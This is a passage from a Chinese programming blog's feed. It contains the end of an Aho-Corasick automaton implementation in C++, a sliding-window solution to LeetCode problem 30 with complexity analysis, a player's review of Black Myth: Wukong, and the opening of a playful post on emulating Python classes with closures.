class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp = tmp-&gt;fail;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!tmp)&#123;<span class="comment">//说明没找到合适的失配指针</span></span><br><span class="line">                p-&gt;fail = root;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 该节点所有子节点入队</span></span><br><span class="line">            <span class="built_in">childEnque</span>(p, q);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="comment">// end while</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">searchPattern</span>(string&amp; s) &#123;</span><br><span class="line">        AC_node *p = root;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;s.<span class="built_in">length</span>(); ++i) &#123;</span><br><span class="line">            <span class="type">char</span> c = s[i];</span><br><span class="line">            <span class="keyword">while</span>(p != <span class="literal">nullptr</span> &amp;&amp; p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                p = p-&gt;fail;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p) &#123;</span><br><span class="line">                p = p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>];    <span class="comment">// 前进一步匹配</span></span><br><span class="line">                <span class="comment">// 判断是否匹配了完整的串</span></span><br><span class="line">                <span class="keyword">if</span>(p-&gt;terminal) &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(vector&lt;<span class="type">int</span>&gt;&#123;i-p-&gt;depth + <span class="number">1</span>, i&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                p = root;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   <span class="comment">// end for</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></details>]]></content>
    
    
    <summary type="html">模式匹配算法：AC自动机</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="算法" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="https://blog.snowflake.zone/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="leetcode" scheme="https://blog.snowflake.zone/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【leetcode题解】30.串联所有单词的子串</title>
    <link href="https://blog.snowflake.zone/posts/23/"/>
    <id>https://blog.snowflake.zone/posts/23/</id>
    <published>2024-09-12T11:05:50.000Z</published>
    <updated>2024-09-12T11:05:50.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述</h2><p>给定一个字符串<code>s</code>和一个字符串数组<code>words</code>。<code>words</code>中所有字符串长度相同。</p><p><code>s</code>中的 <strong>串联子串</strong> 是指一个包含<code>words</code>中所有字符串以任意顺序排列连接起来的子串。</p><p>例如，如果<code>words = [&quot;ab&quot;,&quot;cd&quot;,&quot;ef&quot;]</code>， 那么<code>&quot;abcdef&quot;</code>，<code>&quot;abefcd&quot;</code>，<code>&quot;cdabef&quot;</code>，<code>&quot;cdefab&quot;</code>，<code>&quot;efabcd&quot;</code>，和<code>&quot;efcdab&quot;</code>都是串联子串。<code>&quot;acdbef&quot;</code>不是串联子串，因为他不是任何<code>words</code>排列的连接。</p><p>返回所有串联子串在<code>s</code>中的开始索引。你可以以 <strong>任意顺序</strong> 返回答案。</p><h2 id="解题思路"><a class="markdownIt-Anchor" href="#解题思路"></a> 解题思路</h2><p>首先不妨假定一下字符串<code>s</code>的长度为<code>n</code>，单词列表<code>words</code>长度为<code>l</code>，以及每个单词的长度为<code>w</code>。由于子串由<code>words</code>中的单词以任意顺序排列构成，所以长度是确定的，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mo>×</mo><mi>l</mi></mrow><annotation encoding="application/x-tex">w\times l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span>。那么我们就可以对字串开头进行枚举，而后针对每一个子串，分别统计其中的单词是不是<code>words</code>的一个排列。这样的算法枚举子串开头的时间复杂度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，循环内层的判定的时间复杂度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(l)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span>，算法总的复杂度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nl)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span>.</p><p>有一个明显的可以优化的点在于，假设子串起始下标为<code>st</code>，则当我们检查完<code>[st, st+wl-1]</code>的子串后，我们下一个检查的子串是<code>[st+1, st+wl]</code>。可以看到，检查第二个子串的过程中，其实一大部分是我们在前一次检查中已经扫描过的值，唯一的变化在于子串起始位置和末了位置产生了一定的偏移。因此，可以考虑滑动窗口的方法。</p><p>但在此题中，直接使用滑动窗口似乎没那么好用。究其原因在于当子串左右端点移动时只移动了一个字符，而我们维护的却是以<code>word</code>为单元的出现次数。因此，要使用滑动窗口方法，我们需要将每<code>w</code>个字符视作一个单元；子串端点移动时，也以<code>w</code>个字符为步长进行移动。</p><p>当然，由于滑动窗口的出发点是下标为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>的位置，这样做会使得我们的子串起始点仅能位于<code>w</code>的整数倍处。一个解决方法是我们枚举所有可能的起始点，即模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>的剩余类，这样，子串就可以取到所有可能起始点了。</p><p>这般，我们枚举可能起始点的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span>（即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">w-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>），每一次枚举后使用滑动窗口来判断能否构成满足要求的子串，时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi mathvariant="normal">/</mi><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n/w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span>（因为我们将<code>w</code>个字符视作了一个单元，因此总长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mi>w</mi></mrow><annotation encoding="application/x-tex">n/w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>）。整个算法时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><h2 id="代码c"><a class="markdownIt-Anchor" href="#代码c"></a> 代码（C++）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 用于重置哈希表计数器的函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reset_map</span><span class="params">(unordered_map&lt;string, <span class="type">int</span>&gt;&amp; mp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;kv: mp)&#123;</span><br><span class="line">            kv.second = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从下标st开始的滑动窗口</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">findSubstringAt</span><span class="params">(string&amp; s, vector&lt;string&gt;&amp; words, <span class="type">int</span> st, vector&lt;<span class="type">int</span>&gt;&amp; ans, unordered_map&lt;string, <span class="type">int</span>&gt;&amp; target, unordered_map&lt;string, <span class="type">int</span>&gt;&amp; mp)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> w = words[<span class="number">0</span>].<span class="built_in">length</span>(), l = words.<span class="built_in">size</span>(), n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> cur = st;</span><br><span class="line">        <span class="keyword">while</span>(cur &lt;= n - w)&#123;</span><br><span class="line">            string substr = <span class="built_in">string</span>(s, cur, w);</span><br><span class="line">            <span class="keyword">auto</span> it = mp.<span class="built_in">find</span>(substr);</span><br><span class="line">            <span class="keyword">if</span>(it == mp.<span class="built_in">end</span>())&#123;</span><br><span class="line">                st = cur + w;</span><br><span class="line">                <span class="built_in">reset_map</span>(mp);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                mp[substr] ++;</span><br><span class="line">                <span class="keyword">while</span>(mp[substr] &gt; target[substr])&#123;</span><br><span class="line">                    mp[<span class="built_in">string</span>(s, st, w)] --;</span><br><span class="line">                    st += w;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur - st == w*(l<span class="number">-1</span>))&#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(st);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            cur += w;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findSubstring</span><span class="params">(string s, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>(), l = words.<span class="built_in">size</span>(), w = words[<span class="number">0</span>].<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        unordered_map&lt;string, <span class="type">int</span>&gt; target;  <span class="comment">// 目标每个单词的出现次数</span></span><br><span class="line">        unordered_map&lt;string, <span class="type">int</span>&gt; mp;  <span class="comment">// 窗口中每个单词的出现个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> word: words)&#123;</span><br><span class="line">            mp[word] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> word: words)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target.<span class="built_in">find</span>(word) != target.<span class="built_in">end</span>()) target[word] ++;</span><br><span class="line">            <span class="keyword">else</span> target[word] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对所有可能的出发点，调用findSubstringAt()函数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;w; ++i)&#123;</span><br><span class="line">            <span class="built_in">reset_map</span>(mp);</span><br><span class="line">            <span class="built_in">findSubstringAt</span>(s, words, i, ans, target, mp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="时空复杂度"><a class="markdownIt-Anchor" href="#时空复杂度"></a> 时空复杂度</h2><div class="tag-plugin image"><div class="image-bg"><img src="/assets/023/result.png" alt="时空复杂度" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">时空复杂度</span></div></div>]]></content>
    
    
    <summary type="html">leetcode30.串联所有单词的子串 题解</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="算法" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="https://blog.snowflake.zone/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="滑动窗口" scheme="https://blog.snowflake.zone/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
    <category term="leetcode" scheme="https://blog.snowflake.zone/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【游戏简评】重走西游路：《黑神话：悟空》</title>
    <link href="https://blog.snowflake.zone/posts/22/"/>
    <id>https://blog.snowflake.zone/posts/22/</id>
    <published>2024-08-30T15:02:43.000Z</published>
    <updated>2024-08-30T15:02:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h2><p>这篇文章稍微聊聊《黑神话：悟空》，毕竟我也不是专业游戏评测家，只能从玩家角度发表一点观点。</p><h2 id="总体评价"><a class="markdownIt-Anchor" href="#总体评价"></a> 总体评价</h2><p>IGN给分是8分，论坛对这个分数的评价是比较两极分化的。客观来说我认为应该有9分的水平（不考虑滤镜的话）。总体而言是非常优秀的ARPG类型的游戏，尽管存在一些比较明显的缺点，但就总体质量而言于我来说是满意的。</p><h2 id="剧情设计"><a class="markdownIt-Anchor" href="#剧情设计"></a> 剧情设计</h2><p>对于剧情的评价可能见仁见智。《悟空》选取了一共六回的故事做进了游戏里，分别对应六张彼此之间独立的地图。其在游戏流程中没有太多直白的叙事，相对应的，其在每一回结束时有一段质量较高的动画来完整地展示故事的来龙去脉；故事中的细节，玩家则可以通过游戏中的图鉴系统（游戏中称之为影神图）来了解，个人认为还是比较详细的。对于非考据党来说也可以权当看个小故事。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/022/handbook.png" alt="影神图" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">影神图</span></div></div><p>但就我看来这样的做法有一些缺点：如果玩家没有打完一个boss看一下图鉴的习惯，那么主线就会比较像boss rush。当然这也和《悟空》中较为密集的boss战有关。</p><p>不过总体来说，一方面作为《西游记》的改编作品，玩家或多或少对背景故事有所了解；另一方面每一回的动画制作属实是质量极度在线，倒也不是很大的问题。个人比较喜欢第二回黄风岭这种节奏，每到达一个关键节点都会有一段评弹，艺术性上是足够的享受，功能性上也跟进了剧情发展。</p><h2 id="地图设计"><a class="markdownIt-Anchor" href="#地图设计"></a> 地图设计</h2><p>如果要说这个游戏有什么显著的不足，可能我会把票投给地图设计。玩《悟空》的地图过程中，我倒是不由得直观感受到魂系箱庭设计的成熟。一方面，《悟空》是相对来说的线性流程，必然不能要求有开放世界的自由度；但《悟空》又特别喜欢藏东西，这就导致玩家总希望去一些犄角旮旯企图获得些什么。然而这游戏的空气墙设计属实有点反人类了，看似能走却有空气墙的情况想必只要体验了一定时长的玩家都发现了这个问题。（其实悬崖和峭壁是更好的解决方案，玩家可以很明显看到这条路是行不通的）</p><p>另一方面是没有小地图（致敬传奇ACT只狼），至少我玩起来有点晕头转向。地图上引导也不足，很容易导致迷路的问题（我玩起来感觉盘丝洞的引导问题尤其明显，直到我打通关了才发现有一个土地庙都没有开）。</p><p>不过值得一提的是游戏的风景确实很好，许多场景都不需要特地凹就能拍出很好看的照片（游戏中设计的打坐地点就能感受出来）。本文的封面就是我在最终地图花果山上随手找的风景。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/022/cover.png" alt="花果山" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">花果山</span></div></div><p>B站也有专门做游戏摄影的up拍出来的更加专业的图，有兴趣可以看一眼。</p><div class="tag-plugin link dis-select"><a class="link-card plain" title="我们要拍黑神话悟空，不能只拍黑神话悟空...【第一期】" href="https://www.bilibili.com/video/BV1vZsceJEHZ/" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="icon"><div class="left"><span class="title">我们要拍黑神话悟空，不能只拍黑神话悟空...【第一期】</span><span class="cap link footnote">https://www.bilibili.com/video/BV1vZsceJEHZ/</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div><h2 id="战斗表现"><a class="markdownIt-Anchor" href="#战斗表现"></a> 战斗表现</h2><p>先说战斗难度，《悟空》整体来说战斗难度是比较低的，这很大一部分取决于黑猴自己的超强性能（褪色者落泪）。游戏里，黑猴除了普攻、重击和翻滚（闪身），一般还具有四个主动技能和三套棍法。主动技能如隐身术的瞬间移动和超强破隐一击、对绝大多数怪都适用的定身术换取输出或恢复时间，以及功能强大甚至可以针对每一关的关底boss的法宝都大大降低了游戏难度。棍法中劈棍具有超高的爆发输出、立棍具有更安全的恢复环境、戳棍具有瞬发的强削韧换取主动进攻机会。可以说，除了毫无远程手段而言，黑猴基本上把所有你想要、想玩的性能都给你了，具体取决于你想怎么玩。也正是得益于黑猴超强的性能，其战斗演出也很优秀。很多时候你一通乱按没准就看上去很秀了，观赏性很高。因为战斗涉及一部分剧透，我就不放视频推荐了，现在也有很多极具观赏性的战斗视频。</p><p>再稍微主观评价一下boss的设计。《悟空》绝大多数boss都没什么难度，有难度的boss也大多放在了隐藏支线里（点名小黄龙超高雷电伤害、杨戬逆天机制），除此之外主线卡了我一下的也就只有最终boss大圣残躯了。但是大圣的设计也很微妙，他的招式基本上都是玩家所能掌握的招式的pro max，是比较好熟悉的。初次之外还有一些隐藏小彩蛋，就留给大家自行探索了。多数boss（尤其是人形态boss）互动感是很强的，基本上是见招拆招，加上完美闪身的视听体验沉浸感还是足够的。</p><p>印象比较深刻的毫无体验的怪就是大石敢当，位于花果山的隐藏boss，需要拿到四蕴后解锁。毫无互动性的怪，纯粹为了演出，问题是演出也很无聊，就看着它抡锤子。可能是因为建模很大加上我电脑配置有限，正常战斗疯狂掉帧。好在是没有丝毫难度可言，也没有恶心我太久。</p><p>还有一点也是比较严重的，多出现于后期的怪的问题就是读指令。因为设计原因，黑猴的主要输出方式是普通攻击积攒棍势，而后使用棍法打出爆发输出。然而很多怪在后期都会非常离谱地躲过蓄力攻击（这点让我感受最明显的就是杨戬，基本上除了戳棍的瞬发攻击外，其它棍法都会被很离谱地躲掉，甚至在杨戬连招期间也会躲）。还有部分大题型的多动怪（如碧眼金睛兽）非常容易满蓄棍法打空、空中战斗（亢金龙）导致视角朝上看不清地面警示，很容易产生负面体验。</p><p>总的来说瑕不掩瑜，恶心人的boss总体来说并不算多，绝大多数boss都提供了很好的交互体验。相反由于《悟空》难度低，倒也可以用离谱的伤害强行灌死boss，也没有那么多坐牢的点。</p><h2 id="印象深刻的地方"><a class="markdownIt-Anchor" href="#印象深刻的地方"></a> 印象深刻的地方</h2><div class="tag-plugin colorful note" color="cyan"><div class="body"><p>以下内容涉及剧透。</p></div></div><details class="tag-plugin colorful folding" ><summary><span>黄眉</span></summary><div class="body"><p>说实话boss战背后那个小模型能进去我是没想到的，确实是让我比较惊喜。战斗难度也不算高，流程紧凑，也第一视角讲明白了天命人与本性相对抗的过程。</p><p>战斗设计优秀，创意满分，沉浸感满分。</p></div></details><details class="tag-plugin colorful folding" ><summary><span>大圣残躯</span></summary><div class="body"><p>伟大，无需多言。BGM响起的时候我想没有人会抑制住激动的情绪。整体战斗难度略高，但属于合适的范围中。大圣的招式也基本就是我们招式的强化版本，背板难度也会小很多。有一个特点是大圣的致命攻击反而是好躲的，很多时候都是被一些派生的小动作剐蹭到，比较考验熟练度和细节处理的。</p><p>此外，战斗中的菜单也很惊喜。包括识破立棍、喝药被定身以及被大圣弹反后甩给我们棒子等，都是一些小惊喜。而且这些看似是在嘲讽玩家的菜单也并不会引起玩家不适，一方面是并不致命，另一方面是大圣确实值得。整场战斗相比于攻克强敌更像是比试与交流。</p><p>完全满分的战斗设计。</p></div></details><details class="tag-plugin colorful folding" ><summary><span>二郎显圣真君</span></summary><div class="body"><p>需要解锁所有地图的隐藏地图后解锁。</p><p>杨戬整体来说互动还是很强的，也是游戏里为数不多真的需要玩家去一定程度上拆解招式的角色。杨戬能够很好地应对玩家许多强力攻击，包括定身、蓄力重棍以及削韧压制等。战斗演出也很优秀，四阶段不同的打法设计的的确确一步步展现出了这位战力顶峰的大将的英姿。</p><p>我个人认为杨戬具有全游戏最强的机制和难度。四管护盾下的韧性和减伤加持以及脱战后盾量自回复鼓励玩家不断发起进攻，但杨戬本身的长连段非常考验玩家的应对策略。同时杨戬也具备一定的杀招导致玩家需要格外注意自身状态防止被秒杀。这个boss也是卡了我挺久的。</p><p>个人认为杨戬总体上还是挺不错的，也确实是最具互动性的boss之一。但是四次盾条+主动躲避玩家重棍+在玩家的持续攻击下会强行将玩家踢出一定距离的机制确实是有点夸张？</p></div></details>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="娱乐" scheme="https://blog.snowflake.zone/categories/%E5%A8%B1%E4%B9%90/"/>
    
    <category term="游戏简评" scheme="https://blog.snowflake.zone/categories/%E5%A8%B1%E4%B9%90/%E6%B8%B8%E6%88%8F%E7%AE%80%E8%AF%84/"/>
    
    
    <category term="游戏" scheme="https://blog.snowflake.zone/tags/%E6%B8%B8%E6%88%8F/"/>
    
    <category term="黑神话：悟空" scheme="https://blog.snowflake.zone/tags/%E9%BB%91%E7%A5%9E%E8%AF%9D%EF%BC%9A%E6%82%9F%E7%A9%BA/"/>
    
  </entry>
  
  <entry>
    <title>【整活向】一觉起来，Python的class关键字不见了？？？</title>
    <link href="https://blog.snowflake.zone/posts/21/"/>
    <id>https://blog.snowflake.zone/posts/21/</id>
    <published>2024-08-04T05:49:29.000Z</published>
    <updated>2024-08-04T05:49:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>“欸？为什么我的编辑器给我的<code>class</code>标红了啊？？？”</p><p>“你不知道吗？Python的新版本移除了<code>class</code>关键字啊？”</p><p>“啊？？？”</p><span id="more"></span><h2 id="一个早晨"><a class="markdownIt-Anchor" href="#一个早晨"></a> 一个早晨</h2><p>由于不明原因，我突然没法在Python里使用<code>class</code>关键字了！！！这怎么能够接受呢？我的面向对象编程啊！不行不行，没有<code>class</code>我还怎么写代码！突然，一个声音出现在这小小的房间里。</p><p>“哦哈哈哈哈，还记得我吗？”</p><p>“你是谁？？”</p><p>“闭包——包——嗷——”神秘人悄然离去，只剩下长长的尾音。</p><h2 id="不行你还我class"><a class="markdownIt-Anchor" href="#不行你还我class"></a> 不行！你还我<code>class</code>！</h2><h3 id="第一步模拟类的行为"><a class="markdownIt-Anchor" href="#第一步模拟类的行为"></a> 第一步！模拟类的行为</h3><p>闭包这位同学有一个神奇的性质，就是它会保存自己所存在的上下文环境。在某种意义上，其可以很大程度模拟面向对象的行为。下面就是一个简单的闭包的例子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">g</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> a</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line">g1 = f()</span><br><span class="line">g2 = f()</span><br><span class="line"></span><br><span class="line">g1()</span><br><span class="line">g1()</span><br><span 